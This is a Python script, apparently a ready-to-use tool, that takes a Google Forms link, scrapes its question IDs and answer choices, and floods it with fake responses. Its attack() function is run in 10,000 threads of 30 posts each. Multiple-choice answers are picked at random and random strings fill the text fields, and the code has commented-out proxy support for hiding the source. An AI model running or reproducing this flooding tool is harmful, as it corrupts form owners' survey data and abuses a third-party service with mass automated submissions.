import re
import string
import random
import requests
from pyautogui import prompt
import threading


def random_string(n):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(n))

s = requests.session()



#nếu có proxy , cookies , headers thì gán vào ,
#proxy = {
#    "http": "http://118.69.134.3:80",
#
#}
#s.proxies.update(proxy)
# s.cookies.update(cookies)
# s.headers.update(headers)

if __name__ == '__main__':

    url_in = str( prompt('Nhap Link: ')).strip()
    #url_in = 'https://forms.gle/QqAvRqYRtPibahy36'
    url = s.get(url_in).url
    url_rsp = 'https://docs.google.com/forms/u/0/d/e/'+url.split('/')[-2]+'/formResponse'
    a = s.get(url_rsp).text


    # Biểu thức chính quy để tìm dữ liệu trong cặp ngoặc đôi [[]]
    pattern = r'data-params="%.@.[(.*?)<span class'
    dta ={}
    cau_tra_loi ={}
    matches =  a.split('data-params="%.@.[')
    for mat in matches[1:]:
        rac = mat.split('<span class')[0]
        id_q = rac.split(',', 1)[0]
        data = rac.split(',',1)[1]
        dta[id_q] = data


    for key, value in dta.items():
        value = value.split('&quot;',2)
        ques = value[1]
        value = value[2]
        pattern = r'\[\[(.*?)\]\]'

        value = str(re.findall(pattern, value))
        id_k = value.split("['",1)[1].split(',')[0]
        value = value.split(',',1)[1]
        value = value.split('],[')

        try:
            # nếu nó là trắc nghiệm thì sẽ lấy ra list đáp án
            dap_an = [d_a.split('&quot;')[1] for d_a in value ]
            cau_tra_loi['entry.'+id_k] = dap_an
        except:
            #nếu nó là text input thì random text cho câu trả lời
            cau_tra_loi['entry.'+id_k] = 'kwaxsa'

    #random cau tra loi van ban
    def random_data():
        data_send ={}
        for key,value in cau_tra_loi.items():
            if value != 'kwaxsa':
                value = random.choice(value)
            else:
                value = random_string(10)
            data_send[key] = value
        return data_send


    def attack():
        for _ in range(30):
            try:
                s.post(url_rsp,data=random_data())
                print(1)
            except:
                pass

    for _ in range (10000):
        threading.Thread(target=attack).start()

